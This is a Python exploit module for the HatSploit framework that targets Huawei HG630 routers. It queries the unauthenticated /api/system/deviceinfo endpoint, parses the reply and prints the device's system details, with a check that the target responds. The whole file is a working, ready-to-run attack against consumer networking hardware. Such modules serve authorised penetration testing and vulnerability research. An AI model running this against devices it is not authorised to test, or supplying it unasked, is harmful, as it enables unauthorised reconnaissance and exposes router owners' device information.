#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import json

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Category': "exploit",
        'Name': "Huawei HG630 Information Disclosure",
        'Module': "exploit/linux/huawei/hg630_information_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Eslam Medhat - vulnerability researcher'
        ],
        'Description': "Huawei HG630 information disclosure exploit.",
        'Platform': "linux",
        'Rank': "high"
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/api/system/deviceinfo'
        )

        infos = []
        headers = ('Variable', 'Value')
        data = response.text[
               response.text.find('while(1); /*{') + len('while(1); /*{'):response.text.find('}*/')
               ]

        for info in data.split(','):
            info = info.split(':')
            if len(info) >= 2:
                infos.append((info[0][1:-1], info[1][1:-1]))

        self.print_table("System Information", headers, *infos)

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/api/system/deviceinfo'
        )

        if not response or response.status_code != 200:
            self.print_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        if not self.check(remote_host, remote_port):
            return

        self.exploit(remote_host, remote_port)
